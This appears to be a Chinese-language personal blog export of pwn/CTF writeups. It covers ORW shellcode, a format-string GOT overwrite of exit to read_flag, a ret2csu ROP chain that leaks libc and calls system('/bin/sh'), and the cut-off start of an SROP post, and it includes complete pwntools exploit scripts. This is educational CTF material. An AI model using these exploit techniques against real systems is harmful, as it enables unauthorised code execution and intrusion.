class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rdi, -100     # openat(-100,flag,0,0)  系统调用号 257   在栈上动态构造shellcode  寄存器rdi rsi rdx r10 r8 r9 ...</span><br><span class="hljs-string">    push 0x67616c66   # flag </span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    xor r10, r10</span><br><span class="hljs-string">    push 257</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    push rax    # pread64(fd,buf,0x100,0)  系统调用号 17  将rax传给rdi作为fd</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    sub rsp, 0x100   #分配足够的栈空间来读取flag</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    push 0x100</span><br><span class="hljs-string">    pop rdx</span><br><span class="hljs-string">    xor r10, r10</span><br><span class="hljs-string">    push 17</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    push 1    # writev(1,struct iovec,1)  系统调用号 20  struct iovec len + base*</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    push 0x100</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    push 1</span><br><span class="hljs-string">    pop rdx</span><br><span class="hljs-string">    push 20</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;)&#x27;</span>)<br><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>这里解释一下iovec结构体(分散-聚集I&#x2F;O)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/uio.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> &#123;</span><br>    <span class="hljs-type">void</span>  *iov_base;  <span class="hljs-comment">// 缓冲区起始地址（用户空间内存）</span><br>    <span class="hljs-type">size_t</span> iov_len;   <span class="hljs-comment">// 缓冲区长度（字节数）</span><br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rsi, rsp<br>push 0x100<br>push rsi<br>mov rsi, rsp<br></code></pre></td></tr></table></figure><p>这里把rsp保存至rsi，先<code>push 0x100</code>(len)至栈上，再<code>push rsi</code>(flag起始地址)至栈上，这便形成了一个<code>struct iovec</code>，再把rsp(iov_base指针)传给rdi即可</p><p>同时,总结一下栈结构</p><p>高地址</p><p>argc<br>argv[]<br>envp[]<br>auxv[]<br>…<br>返回地址<br>saved rbp<br>canary   maybe<br>局部变量<br>…   rsp<br>低地址</p><p>LIFO,push压栈<code>rsp -= 8</code>,pop出栈<code>rsp += 8</code>…</p><p>感谢阅读…</p><p>后面再补充吧…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>fmt_got</title>
    <link href="/2025/12/30/fmt-got/"/>
    <url>/2025/12/30/fmt-got/</url>
    
    <content type="html"><![CDATA[<p>你好，又见面了…</p><p>算了今天不废话了，直接看题目吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_118 [<span class="hljs-number">264</span>];<br>  undefined8 local_10;<br>  <br>  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  setup();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tell me what you want to say:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&gt; &quot;</span>);<br>  builtin_strncpy(local_118,<span class="hljs-string">&quot;That\&#x27;s what you want to say...    &quot;</span>,<span class="hljs-number">0x23</span>);<br>  read(<span class="hljs-number">0</span>,local_118 + <span class="hljs-number">0x22</span>,<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">printf</span>(local_118);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nthat\&#x27;s it? boring... bye&quot;</span>);<br>  FUN_00401140(<span class="hljs-number">1</span>);<br>  halt_baddata();<br>&#125;<br></code></pre></td></tr></table></figure><p>还悄悄藏了一个函数…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">read_flag</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  FILE *__stream;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">72</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;flag not found! Contact admin if you see this on the remote server.&quot;</span>);<br>    FUN_00401140(<span class="hljs-number">1</span>);<br>  &#125;<br>  fgets(local_58,<span class="hljs-number">0x40</span>,__stream);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;How you do that... here is the flag:  %s\n&quot;</span>,local_58);<br>  fclose(__stream);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;   <span class="hljs-meta">#ps:反正就是cat flag，写那么长我真没招了</span><br>&#125;<br></code></pre></td></tr></table></figure><p>保护为<code>NX</code>和<code>canary found</code>，但是不好意思，今天不打返回地址，注意到题目存在格式化字符串漏洞，同时保护为<code>partial RELRO</code>，因此<code>GOT</code>表可写，直接利用%n任意写覆盖exit的<code>GOT</code>表地址为<code>read_flag</code>即可</p><p>在此之前，你可能需要一些前置知识</p><p>1.什么是格式化字符串漏洞，本人词不达意，还请参考如下链接(直接点，放心)</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmt</a></p><p>2.什么是got表，什么是plt，动态链接器(ld,哈哈哈)和共享库是什么，程序第一次调用<code>puts</code>这个函数时到底发生了什么，想必经过ret2libc的洗礼，前两个问题的答案你已知晓，但是后两个问题将回到更底层的维度，等待着你去探索(我也在探索中…)，也许我后面会写一篇关于此和ret2dlresolve的文章，等我先沉淀沉淀吧…</p><p>OK，还是回到题目本身</p><p>先观察我们格式化字符的写入点</p><p><img src="/images/6.png" alt="qwq"></p><p>可以看到，我们的<code>AAAA</code>从第十个<code>%p</code>的第低三位个字节开始写起，我们的目标是将exit的got(0x403430)覆写为read_flag(0x401236)，采用<code>%hhn</code>逐字节写的方式</p><p>先将0x403430的最低字节0x30覆写为0x36(注意小端序地址表示法)，注意<code>builtin_strncpy(local_118,&quot;That\&#39;s what you want to say...    &quot;,0x23);</code>已经给了<code>local_118</code>34字节的长度，所以再补20个字节得到0x36(54)便可达到目的</p><p>然后将0x403431，即第低二位字节0x34覆写为0x12即可，注意此时<code>local_118</code>的长度已经是54，而目标是0x12(18)，因此先补202个字节至256(你懂的)，再补18个字节回到0x12，一共220个字节，便成功覆写了exit的<code>GOT</code>为<code>read_flag</code></p><p>先大致写出payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload  = <span class="hljs-string">b&#x27;%20x%?$hhn%220x%?$hhn&#x27;</span><br></code></pre></td></tr></table></figure><p>?即写入地址0x403430和0x403431的位置，我们推理一下，首先?必定为两位数，因此payload所占字节长度为<code>23</code>，而我们输入的字符从第十个<code>%p</code>的第低三位个字节开始写起，因此发送payload后先是6个字节写完了10，而后还有17个字节分别完了11，12，并写了13的1个字节，因此再补7个字节的长度填满13，最后输入要覆写的地址0x403430，0x403431即在14，15的位置，真是一场酣畅淋漓的构造啊…</p><p>当时的我只是傻傻地对着wp猜偏移，经过很长时间的分析(真的很长时间，没人问，纯自己瞎折腾 (╥﹏╥) )才终于理解了本质，现在写下来，希望能帮到困惑的你…</p><p>最后贴一下完整exp(真的很短，但是也真的很值得深思…)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>os = <span class="hljs-string">&quot;linux&quot;</span><br><span class="hljs-comment">#p = process(&#x27;./fmt_got&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46677</span>)<br><br>payload  = <span class="hljs-string">b&#x27;%20x%14$hhn%220x%15$hhn&#x27;</span><br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span><br>payload += p64(<span class="hljs-number">0x403430</span>) + p64(<span class="hljs-number">0x403431</span>)<br><br>p.sendafter(<span class="hljs-string">b&#x27;\n&gt; &#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>好了，又写一篇，感谢阅读，天天开心…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2csu</title>
    <link href="/2025/12/25/ret2csu/"/>
    <url>/2025/12/25/ret2csu/</url>
    
    <content type="html"><![CDATA[<p>别急，还没写…</p><p>好了，现在写了…</p><p>额，还记得上次没有gadget的情况下我们采用了SROP，但是倘若没有syscall也没法控制rax呢，别急，还有一个办法，便是今天的<code>ret2csu</code></p><p>一般的elf文件在<code>libc_start_main</code>中会存在<code>libc_csu_init</code>对libc进行初始化，而恰好<code>libc_csu_init</code>中隐含着两个我们可以利用的gadget…</p><p>一般长这样，<code>gadget1</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">00400606  mov rbx, [rsp+0x8]<br>0040060b  mov rbp, [rsp+0x10]<br>00400610  mov r12, [rsp+0x18]<br>00400615  mov r13, [rsp+0x20]<br>0040061a  mov r14, [rsp+0x28]<br>0040061f  mov r15, [rsp+0x30]<br>00400624  add rsp, 0x38<br>00400628  ret<br></code></pre></td></tr></table></figure><p>也有可能是一串<code>pop</code>，不过本质是一样的</p><p><code>gadget2</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">004005f0 mov     rdx, r15<br>004005f3 mov     rsi, r14<br>004005f6 mov     edi, r13d<br>004005f9 call    qword ptr [r12+rbx*8]<br></code></pre></td></tr></table></figure><p>乍一看，这啥呀，实则我们却能因此控制关键的<code>rdi</code>,<code>rsi</code>和<code>rdx</code>并调用函数，太神秘了…</p><p>好吧，还是来看具体的题目吧</p><p>题目依旧忘记出自哪里了，私密马赛</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">void main(void)<br><br>&#123;<br>  write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Hello, World\n&quot;</span>,<span class="hljs-number">0xd</span>);<br>  vulnerable_function();<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br><br>void vulnerable_function(void)<br>&#123;<br>  undefined1 local_88 [<span class="hljs-number">128</span>];<br>  <br>  read(<span class="hljs-number">0</span>,local_88,<span class="hljs-number">0x200</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑依旧十分简单，保护只有<code>NX</code>，非常轻松便能覆盖返回地址，缓冲区也量大管饱，而gadget便是我们的<code>libc_csu_init</code></p><p>第一步还是先泄露我们的libc基址</p><p>要注意的是:gadget1的地址就在gadget2后面，所以gadget1要执行两次(到ret才结束!)，不过第二次对我们rop链产生影响的只有<code>add rsp, 0x38</code>罢了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span>   <span class="hljs-comment">#填充</span><br>payload1 += p64(gadget1)<br>payload1 += p64(<span class="hljs-number">0</span>)     <span class="hljs-comment">#对齐rsp</span><br>payload1 += p64(<span class="hljs-number">0</span>)     <span class="hljs-comment">#rbx设置为0</span><br>payload1 += p64(<span class="hljs-number">1</span>)     <span class="hljs-comment">#注意:rbp必须设置为1，否则将进入循环，详情自己看汇编...</span><br>payload1 += p64(write_got) + p64(<span class="hljs-number">1</span>)   <span class="hljs-comment">#注意是call qword ptr [r12+rbx*8]，所以写write_got而不是write_plt</span><br>payload1 += p64(write_got) + p64(<span class="hljs-number">8</span>)<br>payload1 += p64(gadget2)   <br>payload1 += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x38</span>  <span class="hljs-comment">#注意神秘的add rsp,0x38</span><br>payload1 += p64(main_addr)  <span class="hljs-comment">#回到main函数...</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>p.send(payload1)<br></code></pre></td></tr></table></figure><p>然后接收并计算关键地址…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = p.recv(<span class="hljs-number">8</span>)<br>write_addr = u64(leak.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>libc_base = write_addr - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br></code></pre></td></tr></table></figure><p>接下来，我们把字符串<code>/bin/sh</code>和<code>system</code>的真实地址写到bss段上</p><p>第二阶段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x88</span><br>payload2 += p64(gadget1)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">1</span>)<br>payload2 += p64(read_got) + p64(<span class="hljs-number">0</span>)<br>payload2 += p64(bss_addr) + p64(<span class="hljs-number">16</span>)<br>payload2 += p64(gadget2)<br>payload2 += <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span><br>payload2 += p64(main_addr)<br><br>p.send(payload2)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.send(p64(sys_addr))<br>p.send(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>这样，我们将rdi设置为<code>/bin/sh</code>所在的地址，并将r12设置为system所在的地址，即可实现<code>call system</code>并获得shell</p><p>最终阶段:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload3 = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x88</span><br>payload3 += p64(gadget1)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">1</span>)<br>payload3 += p64(bss_addr) + p64(bss_addr+<span class="hljs-number">8</span>)<br>payload3 += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(gadget2)<br>payload3 += <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x38</span><br>payload3 += p64(main_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.send(payload3)<br></code></pre></td></tr></table></figure><p>最后也是拿到shell啦~</p><p>你也来试试吧!</p><p>感谢阅读…</p><p>最后还是贴一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>main_addr = <span class="hljs-number">0x400564</span><br>bss_addr = <span class="hljs-number">0x601028</span><br>gadget1 = <span class="hljs-number">0x400606</span><br>gadget2 = <span class="hljs-number">0x4005f0</span><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span><br>payload1 += p64(gadget1)<br>payload1 += p64(<span class="hljs-number">0</span>)<br>payload1 += p64(<span class="hljs-number">0</span>)<br>payload1 += p64(<span class="hljs-number">1</span>)<br>payload1 += p64(write_got) + p64(<span class="hljs-number">1</span>)<br>payload1 += p64(write_got) + p64(<span class="hljs-number">8</span>)<br>payload1 += p64(gadget2)<br>payload1 += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x38</span><br>payload1 += p64(main_addr)<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>p.send(payload1)<br><br>sleep(<span class="hljs-number">1</span>)<br><br>leak = p.recv(<span class="hljs-number">8</span>)<br>write_addr = u64(leak.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>libc_base = write_addr - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x88</span><br>payload2 += p64(gadget1)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">0</span>)<br>payload2 += p64(<span class="hljs-number">1</span>)<br>payload2 += p64(read_got) + p64(<span class="hljs-number">0</span>)<br>payload2 += p64(bss_addr) + p64(<span class="hljs-number">16</span>)<br>payload2 += p64(gadget2)<br>payload2 += <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span><br>payload2 += p64(main_addr)<br><br>p.send(payload2)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.send(p64(sys_addr))<br>p.send(<span class="hljs-string">&quot;/bin/sh\0&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>payload3 = <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x88</span><br>payload3 += p64(gadget1)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">0</span>)<br>payload3 += p64(<span class="hljs-number">1</span>)<br>payload3 += p64(bss_addr) + p64(bss_addr+<span class="hljs-number">8</span>)<br>payload3 += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(gadget2)<br>payload3 += <span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x38</span><br>payload3 += p64(main_addr)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.send(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ps:千万别说我偷懒…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hello pwn!</title>
    <link href="/2025/12/25/hello-pwn/"/>
    <url>/2025/12/25/hello-pwn/</url>
    
    <content type="html"><![CDATA[<p>用此博客来记录我在<code>pwn</code>学习过程中的一些题解与思考</p><p>希望你能有所收获…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2025/12/25/SROP/"/>
    <url>/2025/12/25/SROP/</url>
    
    <content type="html"><![CDATA[<p>建议先看stack pivot再来这里…</p><p>ok题目来自XSWCTF2025初赛的一道<code>pwn</code>，考察了更加精妙的栈风水布局(基于stack pivot)，同时融合着SROP和ORW，来看看吧!</p><p>先看一下题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  undefined1 local_78 [<span class="hljs-number">108</span>];<br>  undefined4 local_c;<br>  <br>  local_c = <span class="hljs-number">0</span>;<br>  setbuf(<span class="hljs-built_in">stdin</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>);<br>  sandbox();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hey hey what are you doing here?&quot;</span>);<br>  FUN_004010e0(<span class="hljs-number">0</span>,local_78,<span class="hljs-number">0x50</span>);   #第一次read，没有溢出<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I say STOP doing this!&quot;</span>);<br>  FUN_004010e0(<span class="hljs-number">0</span>,local_78,<span class="hljs-number">0x200</span>);  #第二次read，存在溢出<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>保护虽然只有<code>NX</code>，但是同时开启了<code>seccomp</code>沙箱(sandbox)，使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump 